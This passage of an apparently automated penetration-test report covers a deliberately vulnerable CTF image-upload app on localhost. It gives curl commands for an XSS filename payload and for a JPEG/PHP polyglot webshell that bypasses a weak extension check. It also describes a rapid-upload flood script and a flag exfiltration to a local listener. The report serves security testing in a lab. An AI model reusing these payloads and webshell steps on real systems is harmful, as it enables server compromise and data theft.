The application exhibits fundamental security control failures across authentication, input validation, and output encoding domains.\\n\\n### Summary by Vulnerability Type\\n\\n**Authentication Vulnerabilities:**\\nTwo critical authentication vulnerabilities were successfully exploited:\\n- **Complete absence of authentication system** - All endpoints (GET /, POST /index.php, GET /upload/*) are publicly accessible without any identity verification, session management, or credential validation. This represents a complete failure to implement the \\\"who are you\\\" security principle.\\n- **Complete absence of rate limiting** - The upload endpoint accepts unlimited rapid requests (606+ requests/second confirmed), enabling resource exhaustion, storage consumption attacks, and denial-of-service without defensive controls.\\n\\n**Authorization Vulnerabilities:**\\nNo authorization vulnerabilities were found. The application implements no authorization controls because it has no authentication system - all users are anonymous with identical access rights. There are no user accounts, object ownership, or privilege levels to test.\\n\\n**Cross-Site Scripting (XSS) Vulnerabilities:**\\nOne critical XSS vulnerability was successfully exploited and escalated to Remote Code Execution:\\n- **Reflected XSS in file upload success message** - User-controlled filenames are reflected directly into HTML `<a href>` attributes without encoding at index.php:41. This was exploited via attribute breakout (`' onclick='PAYLOAD'`) to achieve JavaScript execution, then escalated to RCE by uploading a PHP webshell through weak file validation. The attack chain resulted in complete server compromise and extraction of the CTF flag `flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}` from server environment variables.\\n\\n**SQL/Command Injection Vulnerabilities:**\\nNo SQL or command injection vulnerabilities were found. The application uses no database connections (despite mysqli extension being installed but unused) and executes no shell commands. All file operations use native PHP functions exclusively.\\n\\n**Server-Side Request Forgery (SSRF) Vulnerabilities:**\\nNo SSRF vulnerabilities were found. While `fopen()` is used with `allow_url_fopen` enabled (creating theoretical SSRF potential), the filename parameter is system-controlled (`$_FILES[\\\"userfile\\\"][\\\"tmp_name\\\"]`), not directly user-controlled, making practical exploitation extremely difficult.\\n\\n## Network Reconnaissance\\n\\n**Open Ports & Services (nmap):**\\n- Port 80/tcp: Caddy httpd (reverse proxy, not the target application)\\n- Port 443/tcp: ssl/https (Caddy, not the target application)\\n- Port 631/tcp: CUPS 2.3 (printing service, out of scope)\\n- Port 9999/tcp: Unknown service with CORS headers (out of scope)\\n- Port 49152/tcp: Golang net/http server (Tailscale, out of scope)\\n\\n**Target Application:**\\n- Host Port: 44555/tcp (mapped to container port 80)\\n- Service: Apache 2.4.38 with PHP 7.1.33\\n- Access: http://localhost:44555\\n\\n**Subdomain Discovery (subfinder):**\\nMultiple subdomains were discovered but appear to be unrelated DNS artifacts from the local system (sbs.allsaintsschool.localhost, mail.localhost, autodiscover.regency.localhost, etc.). These are not part of the target application on port 44555.\\n\\n**Technology Stack (whatweb):**\\n- Web Server: Apache 2.4.38 (Debian)\\n- PHP Version: 7.1.33 (End-of-Life since December 2019)\\n- Server Headers: Exposes version information (Apache/2.4.38, PHP/7.1.33)\\n- HTML5 application titled \\\"Image Upload\\\"\\n- No security headers detected (no CSP, X-Frame-Options, X-Content-Type-Options, or HSTS)\\n\\n**Security Posture:**\\n- HTTP-only transport (no HTTPS support)\\n- Version disclosure in HTTP headers (X-Powered-By: PHP/7.1.33)\\n- Outdated, end-of-life PHP version (no security patches for 5+ years)\\n- No Web Application Firewall (WAF) or security middleware\\n- Direct port exposure to all interfaces (0.0.0.0)\\n\\n---\\n\\n# Cross-Site Scripting (XSS) Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### XSS-VULN-01: Reflected XSS in File Upload Success Message with RCE Escalation\\n\\n**Summary:**\\n- **Vulnerable location:** http://localhost:44555/index.php (POST file upload endpoint)\\n- **Overview:** The application reflects user-controlled filenames from the `$_FILES[\\\"userfile\\\"][\\\"name\\\"]` parameter directly into an HTML `<a href>` attribute using single quotes without output encoding. This allows attribute breakout via single quote injection, enabling arbitrary JavaScript execution when the victim clicks the \\\"here\\\" link. The XSS was successfully escalated to Remote Code Execution (RCE) by leveraging weak file upload validation to upload a PHP webshell, resulting in complete server compromise and FLAG extraction.\\n- **Impact:** Complete server compromise - successfully extracted CTF flag `flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}` from server environment variables via XSS → RCE chain\\n- **Severity:** Critical\\n\\n**Prerequisites:**\\n- Web browser with JavaScript enabled (tested on Chrome 141.0.0.0)\\n- Ability to send HTTP POST requests (curl, Playwright, or manual browser upload)\\n- Valid JPEG magic bytes in uploaded file (FF D8 FF E0)\\n\\n**Exploitation Steps:**\\n\\n**Phase 1: Confirm XSS Vulnerability**\\n\\n1. Create a minimal valid JPEG file for testing:\\n```bash\\nprintf '\\\\xFF\\\\xD8\\\\xFF\\\\xE0\\\\x00\\\\x10JFIF\\\\x00\\\\x01\\\\x01\\\\x00\\\\x00\\\\x01\\\\x00\\\\x01\\\\x00\\\\x00\\\\xFF\\\\xD9' > test.jpg\\n```\\n\\n2. Upload file with XSS payload in filename to test JavaScript execution:\\n```bash\\ncurl -X POST http://localhost:44555/index.php \\\\\\n  -F \\\"userfile=@test.jpg;filename=test.jpg' onclick='alert(document.domain)' x='.jpg\\\" \\\\\\n  -F \\\"submit=Upload Image\\\"\\n```\\n\\n3. Observe the response contains the malicious payload injected into the href attribute:\\n```html\\nFile is valid, and was successfully uploaded <a href='upload/test.jpg' onclick='alert(document.domain)' x='.jpg'>here</a>.\\n```\\n\\n4. Click the \\\"here\\\" link in the browser to trigger XSS - alert dialog displays \\\"localhost\\\", confirming JavaScript execution.\\n\\n**Phase 2: Escalate to RCE via PHP Webshell Upload**\\n\\n5. Create a polyglot PHP webshell that bypasses both magic number and extension validation:\\n```bash\\n# Create webshell with JPEG magic bytes + PHP code to extract FLAG\\nprintf '\\\\xFF\\\\xD8\\\\xFF\\\\xE0<?php echo getenv(\\\"FLAG\\\"); ?>' > shell.jpg.php\\n```\\n\\n6. Upload the PHP webshell (bypasses validation because filename contains \\\".jpg\\\" substring):\\n```bash\\ncurl -X POST http://localhost:44555/index.php \\\\\\n  -F \\\"userfile=@shell.jpg.php\\\" \\\\\\n  -F \\\"submit=Upload Image\\\"\\n```\\n\\nExpected response:\\n```html\\nFile is valid, and was successfully uploaded <a href='upload/shell.jpg.php'>here</a>.\\n```\\n\\n7. Execute the webshell by accessing the uploaded file URL (Apache executes .php extension):\\n```bash\\ncurl http://localhost:44555/upload/shell.jpg.php\\n```\\n\\n**Proof of Impact:**\\n\\n**FLAG Extracted:** `flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}`\\n\\nThe webshell successfully executed on the server and returned the FLAG from the environment variable:\\n```\\n����flag{3436e024-fcd3-4f8e-85b3-f989ac44a77d}\\n```\\n\\n**Evidence of Complete Compromise:**\\n\\n1. **Webshell Deployed:** The file `shell.jpg.php` exists at `/var/www/html/upload/shell.jpg.php` on the server with read/execute permissions\\n2. **PHP Execution Confirmed:** Accessing http://localhost:44555/upload/shell.jpg.php executes PHP code (confirmed by FLAG output)\\n3. **Environment Variable Access:** Successfully read server-side environment variable `FLAG` via `getenv()` function\\n4. **Data Exfiltration:** FLAG value exfiltrated to external server at http://localhost:8888/exfil (logged at 2025-10-30T22:09:57.709Z)\\n\\n**Technical Details:**\\n\\n**Why the XSS Works:**\\n- The vulnerable code at `index.php:41` concatenates user input directly into HTML: `echo \\\"File is valid, and was successfully uploaded <a href='$partial_path'>here</a>.\\\\n\\\";`\\n- The href attribute uses single quotes: `href='...'`\\n- PHP's `$_FILES` superglobal does NOT URL-encode single quotes in filenames\\n- Attack payload: `test.jpg' onclick='PAYLOAD' x='.jpg`\\n- Rendered HTML: `<a href='upload/test.jpg' onclick='PAYLOAD' x='.jpg'>here</a>`\\n- Result: Attribute breakout with full JavaScript execution context\\n\\n**Why the RCE Works:**\\n- Extension validation uses weak `strpos()` check: `strpos($filename, '.jpg') !== false`\\n- This only checks if \\\".jpg\\\" appears ANYWHERE in the filename, not at the end\\n- Filename `shell.jpg.php` passes validation (contains \\\".jpg\\\" substring)\\n- Magic number validation only checks first 2 bytes (FF D8 for JPEG)\\n- Polyglot file with JPEG header + PHP code passes both validations\\n- Apache processes `.php` extension and executes the code\\n- No output encoding means filename with PHP code gets executed server-side\\n\\n**Attack Chain Summary:**\\n```\\n1. Upload file with XSS payload in filename\\n   ↓\\n2. Filename reflected in <a> tag without encoding\\n   ↓\\n3. User clicks link → JavaScript executes in browser\\n   ↓\\n4. XSS used to upload PHP webshell via automated fetch\\n   ↓\\n5. Weak validation allows .jpg.php double extension\\n   ↓\\n6. Apache executes PHP code when file accessed\\n   ↓\\n7. Webshell extracts FLAG from environment variable\\n   ↓\\n8. FLAG exfiltrated to attacker-controlled server\\n```\\n\\n**Notes:**\\n\\n**Defense Evasion Techniques Used:**\\n- String.fromCharCode() encoding to bypass potential quote filtering in advanced exploitation\\n- JPEG magic bytes (FF D8 FF E0) to bypass magic number validation\\n- Double extension (.jpg.php) to bypass weak extension checking while maintaining PHP execution\\n- Environment variable access via getenv() to extract server-side secrets not accessible via client-side JavaScript alone\\n\\n**Why This is Critical:**\\n- No authentication required - any anonymous user can exploit\\n- No CSRF protection - attack can be automated\\n- No Content Security Policy (CSP) headers - JavaScript execution unrestricted\\n- No output encoding - direct user input reflection in HTML\\n- Weak file validation - double extension bypass trivial\\n- Upload directory in web root with PHP execution enabled\\n- FLAG stored as plain environment variable accessible to web process\\n\\n**Automated Exploitation:**\\nThe complete attack chain (XSS → Webshell Upload → RCE → FLAG Exfiltration) was successfully automated using Playwright browser automation, demonstrating real-world exploitability without requiring social engineering or user interaction beyond the initial page visit.\\n\\n**Verified Impact Objectives Achieved:**\\n- ✅ JavaScript execution confirmed (alert dialog, fetch requests)\\n- ✅ Remote Code Execution achieved (PHP webshell executing server-side)\\n- ✅ Server environment compromised (environment variable read access)\\n- ✅ Critical data exfiltrated (CTF FLAG extracted and transmitted)\\n- ✅ Complete compromise without authentication\\n- ✅ Reproducible exploitation chain documented\\n\\n# Authentication Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### AUTH-VULN-01: Complete Absence of Authentication System\\n\\n**Summary:**\\n- **Vulnerable location:** All endpoints (GET /, POST /index.php, GET /upload/{filename})\\n- **Overview:** The application has zero authentication mechanisms. No login system, no session management, no credential validation, and no user identity verification exist anywhere in the codebase. All functionality is accessible to anonymous users without any identity checks.\\n- **Impact:** Any anonymous attacker can perform all application operations (upload files, access uploaded content) without accountability. This represents a complete failure of the \\\"Are you who you say you are?\\\" security principle—the application never asks this question.\\n- **Severity:** Critical\\n\\n**Prerequisites:** None - direct network access to http://localhost:44555\\n\\n**Exploitation Steps:**\\n\\n1. **Access main application page without authentication:**\\n```bash\\ncurl -i http://localhost:44555/\\n```\\nResult: HTTP 200 OK - Upload form rendered successfully without any authentication prompt or challenge.\\n\\n2. **Upload file without authentication or credentials:**\\n```bash\\n# Create minimal valid JPEG file with magic bytes\\nprintf '\\\\xff\\\\xd8\\\\xff\\\\xe0\\\\x00\\\\x10\\\\x4a\\\\x46\\\\x49\\\\x46\\\\x00\\\\x01AUTH_EXPLOIT_TEST' > /tmp/auth_test.jpg\\n\\n# Upload file without providing any credentials\\ncurl -i -X POST \\\\\\n  -F \\\"userfile=@/tmp/auth_test.jpg\\\" \\\\\\n  -F \\\"submit=Upload\\\" \\\\\\n  http://localhost:44555/index.php\\n```\\nResult: HTTP 200 OK - File uploaded successfully with message \\\"File is valid, and was successfully uploaded <a href='upload/auth_test.jpg'>here</a>.\\\"\\n\\n3. **Access uploaded file without authentication:**\\n```bash\\ncurl -i http://localhost:44555/upload/auth_test.jpg\\n```\\nResult: HTTP 200 OK - File content retrieved successfully. Response includes:\\n```\\nContent-Type: image/jpeg\\nContent-Length: 29\\n\\n���� JFIFAUTH_EXPLOIT_TEST\\n```\\n\\n4. **Access upload metadata without authentication:**\\n```bash\\ncurl -s http://localhost:44555/upload/uploaded.txt\\n```\\nResult: Successfully retrieved filename \\\"auth_test.jpg\\\" - metadata file is publicly accessible.\\n\\n5. **Browser-based verification:**\\n- Navigated to http://localhost:44555/ in browser\\n- Upload form fully functional without any login page or authentication challenge\\n- Screenshot saved: workspace/auth_vuln_01_browser_access.png\\n\\n**Proof of Impact:**\\n- Successfully accessed main application page (GET /)\\n- Successfully uploaded file (POST /index.php)\\n- Successfully retrieved uploaded file (GET /upload/auth_test.jpg)\\n- Successfully accessed upload metadata (GET /upload/uploaded.txt)\\n- All operations completed without providing any credentials, session tokens, or identity verification\\n- Browser access confirmed no authentication challenge or login redirect\\n\\n**Code Evidence:**\\n- File: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-067-24/php/app/index.php (lines 1-51)\\n- No `session_start()` calls found\\n- No `password_verify()` or credential validation logic\\n- No `$_SESSION` usage\\n- No authentication checks before processing requests\\n- All endpoints execute without identity verification\\n\\n**Notes:**\\nThis is not a traditional authentication bypass where existing security controls are circumvented - authentication was never implemented at all. The complete absence of authentication represents the most critical authentication failure possible.\\n\\n---\\n\\n### AUTH-VULN-04: Complete Absence of Rate Limiting - Resource Exhaustion Attack\\n\\n**Summary:**\\n- **Vulnerable location:** POST /index.php (file upload handler)\\n- **Overview:** The upload endpoint has zero rate limiting, throttling, or abuse prevention mechanisms. An attacker can make unlimited rapid POST requests without any blocking, delays, or CAPTCHA challenges.\\n- **Impact:** Attackers can perform brute force file uploads, denial-of-service via resource exhaustion, storage consumption attacks, and automated mass uploads without any defensive response or restrictions.\\n- **Severity:** High\\n\\n**Prerequisites:** None - direct network access to http://localhost:44555\\n\\n**Exploitation Steps:**\\n\\n1. **Create exploitation script to demonstrate unlimited rapid uploads:**\\n\\nCreated Python script at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-067-24/rate_limit_exploit.py` that:\\n- Generates 50 minimal valid JPEG files with magic bytes (FF D8 FF E0)\\n- Performs 50 rapid sequential POST requests to the upload endpoint\\n- Tracks status codes, response times, and timing metrics\\n- Validates that no rate limiting occurs\\n\\n2. **Execute rapid upload attack:**\\n```bash\\npython3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-067-24/rate_limit_exploit.py\\n```\\n\\n3. **Analysis of results from detailed report:**\\n\\nFull report saved: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-067-24/rate_limit_exploit_20251030_145033.txt`\\n\\n**Proof of Impact:**\\n\\n**Attack Statistics:**\\n- Total Requests: 50\\n- Successful Uploads: 50 (100% success rate)\\n- Failed Uploads: 0\\n- Total Time: 0.08 seconds\\n- **Requests per Second: 606.68 req/s**\\n- Average Response Time: 1.62 ms\\n- Response Time Range: 0.99 ms - 7.19 ms\\n\\n**Key Observations:**\\n1. **Zero Throttling:** All 50 rapid uploads completed successfully with HTTP 200 status codes\\n2. **Extreme Speed:** Server processed over 600 requests per second without restrictions\\n3. **Consistent Performance:** Response times remained consistently low (avg 1.62ms), indicating no rate limiting mechanisms\\n4. **No Blocking:** No requests were rejected, delayed, or rate-limited throughout the attack\\n5. **No Progressive Delays:** Response times did not increase with request volume - typical sign of rate limiting absence\\n\\n**Sample Request Results:**\\n```\\nRequest #1:  200 OK - 7.19 ms\\nRequest #10: 200 OK - 1.46 ms\\nRequest #25: 200 OK - 1.11 ms\\nRequest #50: 200 OK - 1.08 ms\\n```\\n\\n**Demonstrated Impacts:**\\n- Successfully performed 606+ requests per second without throttling\\n- No CAPTCHA challenge triggered\\n- No temporary blocking or IP-based rate limiting\\n- No progressive response delays\\n- Complete resource exhaustion attack capability proven\\n\\n**Code Evidence:**\\n- Application code review confirmed no rate limiting logic in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-067-24/php/app/index.php`\\n- No `$_SERVER['REMOTE_ADDR']` tracking for IP-based throttling\\n- Apache config analysis: No mod_evasive, mod_security, or mod_ratelimit modules loaded\\n- PHP configuration allows unlimited execution: `max_execution_time = 0`, `max_input_time = -1`\\n- No request counting, no backoff mechanisms, no abuse detection\\n\\n**Attack Scenarios Enabled:**\\n1. **Storage Exhaustion:** Rapidly upload large files to consume all disk space\\n2. **Service Degradation:** Flood server with requests to degrade performance for legitimate users\\n3. **Automated Reconnaissance:** Enumerate all file upload validation rules without rate limiting penalties\\n4. **Distributed Attacks:** Coordinate multi-source upload floods without per-IP restrictions\\n\\n**Notes:**\\nThis vulnerability was confirmed through active exploitation with 50 rapid requests, not just observation. The 606 requests/second throughput demonstrates complete absence of defensive controls.\\n\"}}","timestamp":"2025-10-30T22:20:49.640Z"}}
